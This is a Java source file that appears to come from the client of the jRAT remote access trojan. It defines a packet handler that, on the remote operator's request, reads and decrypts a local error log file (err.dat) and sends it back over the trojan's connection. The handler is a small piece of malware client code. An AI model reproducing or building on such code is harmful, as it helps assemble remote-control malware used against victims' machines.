package jrat.client.packets.incoming;

import jrat.client.Connection;
import jrat.client.Main;
import jrat.client.packets.outgoing.Packet65ErrorLog;
import jrat.client.utils.Utils;
import jrat.common.crypto.Crypto;

import java.io.FileInputStream;


public class Packet86ErrorLog extends AbstractIncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		try {
			FileInputStream in = new FileInputStream("err.dat");
			String str = Utils.readString(in);
			in.close();

			con.addToSendQueue(new Packet65ErrorLog(Crypto.decrypt(str, Main.getKey())));
		} catch (Exception ex) {
			con.addToSendQueue(new Packet65ErrorLog("Could not load error log file: err.dat: " + ex.getClass().getSimpleName() + ": " + ex.getMessage()));
		}
	}

}
